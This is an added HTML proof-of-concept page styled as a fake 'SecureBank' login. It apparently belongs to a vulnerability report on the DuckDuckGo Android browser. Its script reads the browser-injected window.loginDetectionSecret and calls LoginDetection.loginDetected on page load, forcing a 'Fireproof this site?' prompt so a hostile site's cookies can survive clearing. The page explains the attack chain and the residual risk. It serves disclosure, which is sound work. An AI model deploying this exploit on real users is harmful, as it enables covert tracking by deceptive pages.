@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SecureBank — Sign In</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: Arial, sans-serif; background: #f0f4f8; color: #333; }
+
+    /* ── Fake bank header ──────────────────────────────────────────── */
+    .site-header {
+      background: #1a237e; color: #fff; padding: 12px 24px;
+      display: flex; align-items: center; gap: 12px;
+    }
+    .site-header span { font-size: 1.2rem; font-weight: bold; }
+    .site-header small { font-size: 0.75rem; opacity: 0.7; }
+
+    /* ── Page layout ───────────────────────────────────────────────── */
+    .page { max-width: 480px; margin: 40px auto; padding: 0 16px; }
+    .card {
+      background: #fff; border-radius: 8px; padding: 28px;
+      box-shadow: 0 2px 12px rgba(0,0,0,.1); margin-bottom: 20px;
+    }
+    .card h2 { font-size: 1.1rem; color: #1a237e; margin-bottom: 20px; }
+
+    /* ── Login form ────────────────────────────────────────────────── */
+    label  { display: block; font-size: 0.85rem; color: #666; margin-bottom: 4px; margin-top: 14px; }
+    input[type=text], input[type=password] {
+      width: 100%; padding: 10px 12px; border: 1px solid #ccc;
+      border-radius: 6px; font-size: 1rem; outline: none;
+    }
+    input[type=text]:focus, input[type=password]:focus { border-color: #1a237e; }
+    .btn {
+      display: block; width: 100%; padding: 12px; margin-top: 20px;
+      background: #1a237e; color: #fff; border: none; border-radius: 6px;
+      font-size: 1rem; cursor: pointer; font-weight: bold;
+    }
+    .btn:active { opacity: 0.85; }
+    .btn.secondary { background: #455a64; margin-top: 8px; }
+
+    /* ── PoC control panel ─────────────────────────────────────────── */
+    .poc-panel {
+      background: #fff; border-radius: 8px; padding: 20px;
+      box-shadow: 0 2px 12px rgba(0,0,0,.1); margin-bottom: 20px;
+      border-left: 4px solid #f44336;
+    }
+    .poc-panel h3 { color: #b71c1c; font-size: 0.95rem; margin-bottom: 10px; }
+    .poc-panel p  { font-size: 0.82rem; color: #555; margin-bottom: 8px; line-height: 1.5; }
+    .poc-panel code { background: #f5f5f5; padding: 1px 5px; border-radius: 3px; font-size: 0.85em; }
+
+    /* ── Status banner ─────────────────────────────────────────────── */
+    #status-bar {
+      border-radius: 6px; padding: 12px 14px; font-size: 0.9rem;
+      font-weight: bold; margin-bottom: 14px;
+      background: #e3f2fd; color: #1565c0;
+    }
+    #status-bar.waiting  { background: #fff8e1; color: #f57f17; }
+    #status-bar.ready    { background: #e8f5e9; color: #1b5e20; }
+    #status-bar.fired    { background: #fff3e0; color: #e65100; }
+    #status-bar.success  { background: #ffebee; color: #b71c1c; }
+
+    /* ── Evidence log ──────────────────────────────────────────────── */
+    .log-box {
+      background: #0d0d0d; border-radius: 6px; padding: 14px;
+      font-family: monospace; font-size: 0.78rem; max-height: 320px;
+      overflow-y: auto; color: #aaa;
+    }
+    .log-box .e-ok   { color: #69f0ae; }
+    .log-box .e-hit  { color: #ff5252; font-weight: bold; }
+    .log-box .e-warn { color: #ffd740; }
+    .log-box .e-info { color: #40c4ff; }
+    .log-box .e-dim  { color: #777; }
+    .log-box div { margin: 3px 0; border-bottom: 1px solid #1a1a1a; padding-bottom: 3px; }
+
+    /* ── How it works diagram ──────────────────────────────────────── */
+    pre.chain {
+      background: #f5f5f5; border-radius: 6px; padding: 14px;
+      font-size: 0.78rem; overflow-x: auto; line-height: 1.6;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ── Fake bank header ────────────────────────────────────────────── -->
+  <div class="site-header">
+    🏦 <span>SecureBank</span>
+    <small>Online Banking — Sign In</small>
+  </div>
+
+  <div class="page">
+
+    <!-- ── PoC Control Panel ───────────────────────────────────────────── -->
+    <div class="poc-panel">
+      <h3>🔬 LoginDetection PoC — Vulnerability #2</h3>
+      <p>
+        Open this page in the <strong>DuckDuckGo Android browser</strong>. DDG will automatically
+        inject <code>window.loginDetectionSecret</code> into this page's JavaScript context.
+        This PoC reads that secret and calls <code>LoginDetection.loginDetected(secret)</code>
+        directly — triggering DDG's real <em>"Fireproof this site?"</em> dialog without any
+        actual login having occurred.
+      </p>
+      <p>
+        <strong>Requirement:</strong> DDG Settings → Privacy → "Automatically fireproof sites
+        after login" must be set to <em>Ask every time</em> or <em>Always</em> (not <em>Never</em>).
+      </p>
+
+      <!-- Status bar -->
+      <div id="status-bar" class="waiting">
+        ⏳ Waiting for DDG to inject <code>window.loginDetectionSecret</code>…
+      </div>
+
+      <!-- Buttons -->
+      <button class="btn" onclick="manualFire()">🚨 Fire Attack Manually</button>
+      <button class="btn secondary" onclick="clearLog()">Clear Log</button>
+    </div>
+
+    <!-- ── Evidence log ─────────────────────────────────────────────────── -->
+    <div class="card">
+      <h2>Evidence Log</h2>
+      <div class="log-box" id="log"></div>
+    </div>
+
+    <!-- ── Fake login form (makes the page look like a real login page) ─── -->
+    <div class="card">
+      <h2>Sign in to Online Banking</h2>
+      <form id="login-form" onsubmit="formSubmit(event)">
+        <label for="username">Username / Email</label>
+        <input type="text" id="username" name="username" autocomplete="username"
+               placeholder="your@email.com">
+
+        <label for="password">Password</label>
+        <!-- The real DDG login detection also fires when this field is filled + form submitted -->
+        <input type="password" id="password" name="password" autocomplete="current-password"
+               placeholder="••••••••">
+
+        <button type="submit" class="btn">Sign In</button>
+      </form>
+    </div>
+
+    <!-- ── Expected result ──────────────────────────────────────────────── -->
+    <div class="card">
+      <h2>Expected Result</h2>
+      <p style="font-size:0.88rem;line-height:1.6;color:#444">
+        On a DuckDuckGo Android browser with login detection enabled, DDG will show a native
+        <strong>"Fireproof <em>[this site]</em>?"</strong> dialog seconds after this page loads
+        — even without submitting the form. The attack has already fired automatically.
+      </p>
+      <p style="font-size:0.88rem;line-height:1.6;color:#444;margin-top:8px">
+        <strong>Why this matters:</strong> Any web page opened in DDG Android can call
+        <code>LoginDetection.loginDetected(window.loginDetectionSecret)</code> immediately after
+        load. The <code>window.loginDetectionSecret</code> variable is injected into every page's
+        JS context by the DDG browser. An attacker-controlled page (phishing site, malicious ad
+        landing page, etc.) can use this to force DDG to treat itself as a "logged-in site" and
+        ask the user to fireproof it — making the malicious site's cookies survive DDG's automatic
+        fire clearing.
+      </p>
+    </div>
+
+    <!-- ── How it works ─────────────────────────────────────────────────── -->
+    <div class="card">
+      <h2>Attack Chain</h2>
+      <pre class="chain">
+1. User navigates to attacker's page in DDG Android browser
+
+2. DDG's JsLoginDetector.injectLoginFormDetectionJS() fires on onPageStarted:
+     webView.evaluateJavascript(
+       "javascript:(function(){
+          window.loginDetectionSecret = '<UUID>';   ← injected into THIS page
+          [login detection helper functions]
+        })()", null)
+
+3. This page's JS polls window.loginDetectionSecret every 50ms
+
+4. As soon as the secret appears, this page calls:
+     LoginDetection.loginDetected(window.loginDetectionSecret)
+
+5. LoginDetectionJavascriptInterface.loginDetected(secret) validates:
+     this.secret == secret  →  ✅ MATCH  (same UUID)
+
+6. onLoginDetected() fires → BrowserTabViewModel.loginDetected()
+     → NavigationAwareLoginDetector.onEvent(LoginAttempt(currentUrl))
+     → DDG UI: "Fireproof this site?" dialog appears for THIS PAGE's URL
+
+Pre-fix (vulnerable): loginDetected() took ZERO args — any iframe could fire it.
+Current (fixed):      loginDetected(secret) blocks cross-origin iframes that
+                      cannot read window.loginDetectionSecret across origins (SOP).
+                      But the MAIN FRAME always has the secret injected directly.
+      </pre>
+    </div>
+
+  </div><!-- /page -->
+
+  <script>
+    /* ====================================================================
+       LoginDetection Vulnerability PoC — MAIN FRAME ATTACK
+
+       This PoC demonstrates that:
+       1. DDG injects window.loginDetectionSecret into EVERY page it loads.
+       2. Any JavaScript in the main frame can read that secret immediately.
+       3. Calling LoginDetection.loginDetected(secret) with the real secret
+          triggers DDG's fireproof dialog for the current page's URL.
+       4. The attacker does not need a login form, a POST request, or any
+          user interaction — just loading this page is enough.
+
+       The cross-origin-iframe fix (requiring a secret that iframes can't
+       read from the parent frame) is effective for iframe attacks.
+       The main-frame attack documented here is the residual risk: any page
+       the user visits directly can fake a login event.
+       ==================================================================== */
+
+    var attackFired  = false;
+    var secretFound  = null;
+    var pollTimer    = null;
+
+    /* ── Step 1: Check for the LoginDetection bridge ─────────────────── */
+    appendLog('Page loaded. Checking for LoginDetection interface…', 'e-info');
+
+    if (typeof LoginDetection === 'undefined') {
+      appendLog(
+        '❌ LoginDetection interface NOT found. ' +
+        'Open this page in the DuckDuckGo Android browser. ' +
+        'The interface is registered by the app — it does not exist in desktop browsers.',
+        'e-hit'
+      );
+      setStatus('LoginDetection interface not found. Open in DDG Android browser.', '');
+    } else {
+      appendLog('✅ LoginDetection interface FOUND — bridge is accessible.', 'e-ok');
+      appendLog(
+        'Polling for window.loginDetectionSecret (DDG injects it shortly after page load)…',
+        'e-info'
+      );
+      setStatus('LoginDetection found — waiting for secret injection…', 'waiting');
+      pollTimer = setInterval(checkSecret, 50);
+    }
+
+    /* ── Step 2: Poll until window.loginDetectionSecret is injected ──── */
+    function checkSecret() {
+      var s = window.loginDetectionSecret;
+      if (s && typeof s === 'string' && s.length > 0) {
+        clearInterval(pollTimer);
+        secretFound = s;
+        appendLog('✅ window.loginDetectionSecret injected by DDG: "' + s + '"', 'e-ok');
+        setStatus('Secret obtained — firing attack…', 'fired');
+        setTimeout(fireAttack, 100);   /* slight delay for UI to update */
+      }
+    }
+
+    /* ── Step 3: Fire the real attack ────────────────────────────────── */
+    function fireAttack() {
+      if (attackFired) return;
+      attackFired = true;
+
+      var secret = secretFound || window.loginDetectionSecret || '';
+
+      appendLog('Calling LoginDetection.loginDetected("' + secret.substring(0,8) + '…")…', 'e-info');
+
+      try {
+        LoginDetection.loginDetected(secret);
+
+        appendLog(
+          '🚨 LoginDetection.loginDetected(secret) called successfully! ' +
+          'DDG should now show the "Fireproof this site?" dialog for: ' +
+          window.location.href,
+          'e-hit'
+        );
+        appendLog(
+          'Attack impact: DDG treats this page as a site where a login occurred. ' +
+          'The user will be prompted to fireproof ' + window.location.origin + '. ' +
+          'If they click yes, this site\'s cookies will survive DDG\'s fire clearing — ' +
+          'a malicious site could use this to maintain persistent tracking.',
+          'e-warn'
+        );
+        setStatus('🚨 Attack fired — watch for DDG "Fireproof this site?" dialog!', 'success');
+
+      } catch (e) {
+        appendLog('loginDetected() threw: ' + e.message, 'e-warn');
+        setStatus('Unexpected error: ' + e.message, '');
+      }
+    }
+
+    /* ── Manual fire button handler ──────────────────────────────────── */
+    function manualFire() {
+      if (typeof LoginDetection === 'undefined') {
+        appendLog('❌ LoginDetection not found — open in DDG Android browser.', 'e-hit');
+        return;
+      }
+      var secret = window.loginDetectionSecret || '';
+      if (!secret) {
+        appendLog('window.loginDetectionSecret not yet injected — retrying poll…', 'e-warn');
+        if (!pollTimer) {
+          pollTimer = setInterval(checkSecret, 50);
+        }
+        return;
+      }
+      appendLog('[Manual] Firing attack with secret: "' + secret.substring(0,8) + '…"', 'e-info');
+      attackFired = false;  /* allow re-fire */
+      secretFound = secret;
+      fireAttack();
+    }
+
+    /* ── Form submit (also triggers real DDG login detection on patched build) */
+    function formSubmit(evt) {
+      evt.preventDefault();
+      var pwd = document.getElementById('password').value;
+      if (!pwd) {
+        appendLog('[Form] No password entered — DDG scan would find no visible password field.', 'e-dim');
+        return;
+      }
+      appendLog('[Form] Form submitted with password field — DDG\'s legitimate login detection will also fire.', 'e-info');
+      /* Let the form trigger DDG's natural scanForPasswordField() path as well */
+    }
+
+    /* ── Helpers ─────────────────────────────────────────────────────── */
+    function appendLog(text, cls) {
+      var div = document.createElement('div');
+      div.className = cls || 'e-dim';
+      div.textContent = '[' + timestamp() + '] ' + text;
+      var box = document.getElementById('log');
+      box.appendChild(div);
+      box.scrollTop = box.scrollHeight;
+    }
+
+    function clearLog() {
+      document.getElementById('log').innerHTML = '';
+    }
+
+    function setStatus(text, cls) {
+      var el = document.getElementById('status-bar');
+      el.textContent = text;
+      el.className = cls || '';
+    }
+
+    function timestamp() {
+      return new Date().toISOString().replace('T', ' ').substring(0, 23);
+    }
+  </script>
+
+</body>
+</html>
